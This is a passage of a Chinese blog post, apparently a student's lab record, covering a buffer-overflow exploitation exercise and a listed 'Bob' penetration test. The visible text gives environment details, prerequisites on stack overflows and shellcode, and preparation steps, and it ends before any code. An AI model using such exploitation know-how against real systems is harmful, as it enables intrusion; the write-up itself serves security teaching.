<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="mask-icon" href="https://raw.githubusercontent.com/moyuan10086/photo/main/blackground.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"moyuan10086.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="实训1 项目名称：   缓冲区溢出利用一、环境及工具基本信息 实验环境：Windows操作系统，使用Dev-C++ 5.11进行编译 设备：个人计算机 前置知识：C&#x2F;C++编程基础，汇编语言基础，操作系统原理，网络安全基础 必要的课程：计算机安全，网络安全 说明：本实验旨在通过实践操作，深入理解缓冲区溢出的原理和利用方法，掌握编写和执行shellcode的基本技能。 推荐的文章链接：(缓冲区溢出漏">
<meta property="og:type" content="article">
<meta property="og:title" content="实训记录">
<meta property="og:url" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="Moyuan&quot;s website">
<meta property="og:description" content="实训1 项目名称：   缓冲区溢出利用一、环境及工具基本信息 实验环境：Windows操作系统，使用Dev-C++ 5.11进行编译 设备：个人计算机 前置知识：C&#x2F;C++编程基础，汇编语言基础，操作系统原理，网络安全基础 必要的课程：计算机安全，网络安全 说明：本实验旨在通过实践操作，深入理解缓冲区溢出的原理和利用方法，掌握编写和执行shellcode的基本技能。 推荐的文章链接：(缓冲区溢出漏">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/v2-1b6a999604597d4bdc536eb59c2955aa_b.jpg">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/v2-48df59365aad345eb680d0da0cc56ab3_b.jpg">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240829030133682.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240829030045795.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141647865.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141659202.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141706938.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141713797.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141723487.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141733407.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141740142.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141752071.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141800874.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141808492.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141816283.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141825548.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141833223.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141841368.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141851414.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141859074.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240131141932525.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16-1724871442433-3.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWmhhb-iUq-WEvw==,size_20,color_FFFFFF,t_70,g_se,x_16-1724871446757-6.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104101540865.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104105100943.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104105348461.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/88273c8bd8574284b500608dd88d3c39.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104110302654.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/ca353b6520cc4aac92ab4efecbff6865.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/a170dfe4c21442a4a16ddbc44c58bb20.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104111710582.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104113747750.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104113947574.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114138182.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114223567.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114350590.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104114724876.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104134629831.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104135039398.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104140414325.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104162504862.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104142417794.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104164728109.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104144346262.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104145017010.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104145328639.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104160041914.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104160633573.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104155409288.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161606959.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161706416.png">
<meta property="og:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/image-20240104161832640.png">
<meta property="article:published_time" content="2024-01-31T18:00:18.000Z">
<meta property="article:modified_time" content="2024-08-28T19:03:42.526Z">
<meta property="article:author" content="moyuan">
<meta property="article:tag" content="溢出">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/v2-1b6a999604597d4bdc536eb59c2955aa_b.jpg">


<link rel="canonical" href="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/","path":"2024/02/01/实训记录/","title":"实训记录"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>实训记录 | Moyuan"s website</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Moyuan"s website</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">welcome to my website</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E8%AE%AD1-%E9%A1%B9%E7%9B%AE%E5%90%8D%E7%A7%B0%EF%BC%9A-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">实训1 项目名称：   缓冲区溢出利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%8F%8A%E5%B7%A5%E5%85%B7"><span class="nav-number">1.1.</span> <span class="nav-text">一、环境及工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">1.1.1.</span> <span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.2.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.1.3.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.4.</span> <span class="nav-text">实验原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%A6%82%E8%BF%B0"><span class="nav-number">1.1.5.</span> <span class="nav-text">实验概述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%AD%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">1.1.6.</span> <span class="nav-text">实验中可能出现的问题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E8%AE%AD%E6%B5%81%E7%A8%8B%E5%8F%8A%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">二、实训流程及分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">三、总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%94%B6%E8%8E%B7"><span class="nav-number">1.3.1.</span> <span class="nav-text">实验收获</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%96%B9%E6%B3%95"><span class="nav-number">1.3.2.</span> <span class="nav-text">实验方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C"><span class="nav-number">1.3.3.</span> <span class="nav-text">实验结果</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%A8%E8%AE%BA"><span class="nav-number">1.3.4.</span> <span class="nav-text">分析与讨论</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%BB%93%E8%AE%BA"><span class="nav-number">1.3.5.</span> <span class="nav-text">实验结论</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.6.</span> <span class="nav-text">实验总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E8%AE%AD2-%E9%A1%B9%E7%9B%AE%E5%90%8D%E7%A7%B0%EF%BC%9A-Bob%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">2.</span> <span class="nav-text">实训2 项目名称：   Bob渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%8F%8A%E5%B7%A5%E5%85%B7-1"><span class="nav-number">2.0.1.</span> <span class="nav-text">一、环境及工具</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">2.0.1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">2.0.1.2.</span> <span class="nav-text">工具</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%A6%82%E8%BF%B0-1"><span class="nav-number">2.0.1.3.</span> <span class="nav-text">实验概述</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C-1"><span class="nav-number">2.0.1.4.</span> <span class="nav-text">准备工作</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E8%AE%AD%E6%B5%81%E7%A8%8B%E5%8F%8A%E5%88%86%E6%9E%90-1"><span class="nav-number">2.0.2.</span> <span class="nav-text">二、实训流程及分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.0.2.1.</span> <span class="nav-text">1. 信息收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.0.2.2.</span> <span class="nav-text">2. 网站信息收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F"><span class="nav-number">2.0.2.3.</span> <span class="nav-text">3. 敏感文件扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">2.0.2.4.</span> <span class="nav-text">4. 渗透测试</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"><span class="nav-number">2.0.2.5.</span> <span class="nav-text">5. 抓包分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-%E8%8E%B7%E5%8F%96Shell%E6%8E%A7%E5%88%B6%E6%9D%83"><span class="nav-number">2.0.2.6.</span> <span class="nav-text">6. 获取Shell控制权</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-%E5%85%B7%E4%BD%93%E7%BB%86%E8%8A%82"><span class="nav-number">2.0.2.7.</span> <span class="nav-text">7. 具体细节</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%80%BB%E7%BB%93-1"><span class="nav-number">2.0.3.</span> <span class="nav-text">三、总结</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">moyuan</p>
  <div class="site-description" itemprop="description">prograing or coffee</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/moyuan10086" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;moyuan10086" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2572045628@qq.com" title="E-Mail → mailto:2572045628@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          链接
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://github.com/" title="https:&#x2F;&#x2F;github.com&#x2F;" rel="noopener" target="_blank">GitHub</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/02/01/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="实训记录 | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          实训记录
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-02-01 02:00:18" itemprop="dateCreated datePublished" datetime="2024-02-01T02:00:18+08:00">2024-02-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-08-29 03:03:42" itemprop="dateModified" datetime="2024-08-29T03:03:42+08:00">2024-08-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="实训1-项目名称：-缓冲区溢出利用"><a href="#实训1-项目名称：-缓冲区溢出利用" class="headerlink" title="实训1 项目名称：   缓冲区溢出利用"></a>实训1 项目名称：   缓冲区溢出利用</h2><h3 id="一、环境及工具"><a href="#一、环境及工具" class="headerlink" title="一、环境及工具"></a>一、环境及工具</h3><h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><ul>
<li>实验环境：Windows操作系统，使用Dev-C++ 5.11进行编译</li>
<li>设备：个人计算机</li>
<li>前置知识：C/C++编程基础，汇编语言基础，操作系统原理，网络安全基础</li>
<li>必要的课程：计算机安全，网络安全</li>
<li>说明：本实验旨在通过实践操作，深入理解缓冲区溢出的原理和利用方法，掌握编写和执行shellcode的基本技能。</li>
<li>推荐的文章链接：(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/15952483.html">缓冲区溢出漏洞的原理及其利用实战 - 浅易深 - 博客园 (cnblogs.com)</a>)</li>
</ul>
<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><ul>
<li><p><strong>C/C++编程基础</strong>：理解数组、指针、字符串处理函数（如strcpy）的使用，以及函数调用过程中栈帧的变化。</p>
</li>
<li><p><strong>操作系统原理</strong>：了解进程和线程的基本概念，以及内存管理中的堆、栈、代码区和数据区。</p>
</li>
<li><p><strong>汇编语言基础</strong>：能够阅读和理解简单的汇编代码，了解寄存器的作用和常见的汇编指令。</p>
</li>
<li><p><strong>调试工具的使用</strong>：熟悉使用OllyDbg、IDA Pro等调试工具来分析程序的执行过程和内存布局。</p>
</li>
<li><p><strong>安全编程概念</strong>：了解缓冲区溢出漏洞的成因，以及如何通过安全编程实践来预防这类漏洞。</p>
</li>
<li><p><strong>Windows API函数</strong>：对于Windows平台，需要了解如何使用MessageBoxA、ExitProcess等API函数。</p>
</li>
<li><p><strong>Shellcode编写</strong>：理解如何编写简单的shellcode来执行特定的系统调用，如弹出对话框。</p>
</li>
<li><p><strong>动态链接库（DLL）和函数地址获取</strong>：了解如何在程序中加载DLL并获取特定函数的地址。</p>
</li>
<li><p><strong>操作系统保护机制</strong>：了解现代操作系统中用于防御缓冲区溢出的机制，如数据执行保护（DEP）和地址空间布局随机化（ASLR）。</p>
</li>
<li><p>Linux，x86体系结构，x86汇编，C语言，gdb</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/PC-Assembly-Language.pdf">PC Assembly Language</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/gcc-x86-Assembly.pdf">gcc x86 Assembly Quick Reference</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/supplements/gdb-refcard.pdf">GDB Quick Reference</a></p>
</li>
</ul>
</li>
</ul>
<ul>
<li><strong>缓冲区溢出（buffer overflow）</strong>：在计算机安全和程序设计中的一种异常，当一个程序向缓冲区写入数据时，超出了缓冲区边界并且覆盖了相邻内存。</li>
<li><p><strong>调用栈（call stack）</strong>：用于存储程序中运行子例程信息的栈数据结构，先入后出。</p>
</li>
<li><p><strong>栈缓冲区溢出（stack buffer overflow）</strong>：程序向调用栈中原本缓冲区之外的内存地址写入数据，意图获取对指令指针的控制，将其指向恶意代码。</p>
</li>
</ul>
<h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><ol>
<li><strong>环境搭建</strong>：确保操作系统和编译器已正确安装，调试工具OllyDbg和IDA Pro已配置好。</li>
<li><strong>知识复习</strong>：回顾C/C++编程基础，特别是数组和指针的使用，以及操作系统中堆栈的工作原理。</li>
<li><strong>实验目的</strong>：明确实验的目标是理解和掌握缓冲区溢出攻击的原理和方法。</li>
<li><strong>实验内容</strong>：详细阅读实验指导书，了解实验步骤和预期结果。</li>
<li><strong>参考资料</strong>：查阅相关文献和网络资源，如<a target="_blank" rel="noopener" href="https://www.sojson.com/ascii.html">缓冲区溢出利用实验遇到的几个问题</a>，为实验提供理论支持。</li>
</ol>
